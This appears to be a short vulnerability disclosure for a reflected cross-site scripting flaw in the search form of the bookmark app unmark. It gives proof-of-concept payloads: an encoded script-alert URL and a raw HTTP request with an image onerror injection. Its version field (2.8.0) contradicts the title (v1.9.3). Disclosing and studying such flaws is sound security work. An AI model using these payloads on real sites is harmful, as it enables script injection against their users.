# XSS vulnerability in unmark v1.9.3 of file /searchform.php

**vender**:

- [cdevroe/unmark: An open source to do app for bookmarks.](https://github.com/cdevroe/unmark)

**SoftLink**:

- [Release 1.9.3 · cdevroe/unmark](https://github.com/cdevroe/unmark/releases/tag/v1.9.3)

**Vulnerable File**

- application\views\layouts\topbar\searchform.php

**Version**

- 2.8.0

### POC

http://localhost/marks/search?q=%22%3E%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E

```
"><script>alert('XSS')</script>
```



```
GET /marks/search?q=%22%3E%3C%2FA%3E%3CiMg+id%3D%27JBPoFOup%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CA+href%3D%22 HTTP/1.1
Host: www.unmark17.top
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: BookEmDanno=1qvtcijlqa1kvgtlmq1slmqibjj2rds4
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate


```





![image-20250826020434520](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508260204728.png)





![image-20250826020856949](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202508260208158.png)